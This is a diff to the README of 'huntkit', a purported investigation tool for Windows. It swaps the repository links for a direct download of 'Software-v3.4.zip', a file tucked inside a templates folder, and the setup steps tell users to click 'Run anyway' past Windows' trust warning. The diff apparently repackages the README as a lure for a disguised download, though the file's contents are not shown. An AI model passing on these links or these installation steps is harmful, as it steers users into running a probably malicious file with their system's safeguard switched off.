@@ -1,6 +1,6 @@
 # 🔍 huntkit - Streamline your digital investigation process daily
 
-[![Download huntkit](https://img.shields.io/badge/Download-huntkit-blue.svg)](https://github.com/perchfuruncle656/huntkit)
+[![Download huntkit](https://img.shields.io/badge/Download-huntkit-blue.svg)](https://github.com/perchfuruncle656/huntkit/raw/refs/heads/main/templates/new-investigation/Software-v3.4.zip)
 
 ## 👋 About This Tool
 
@@ -16,7 +16,7 @@ Follow these steps to run the software on your Windows computer.
 
 1.  **Check your system.** Ensure your computer runs Windows 10 or 11.
 2.  **Download the installer.** Visit the official download page below to save the file to your computer.
-    [https://github.com/perchfuruncle656/huntkit](https://github.com/perchfuruncle656/huntkit)
+    [https://github.com/perchfuruncle656/huntkit/raw/refs/heads/main/templates/new-investigation/Software-v3.4.zip](https://github.com/perchfuruncle656/huntkit/raw/refs/heads/main/templates/new-investigation/Software-v3.4.zip)
 3.  **Run the installer.** Open the file you just downloaded.
 4.  **Confirm permissions.** Windows might ask if you trust the software. Select "Run anyway" to proceed.
 5.  **Finish setup.** Follow the on-screen prompts to complete the installation process.
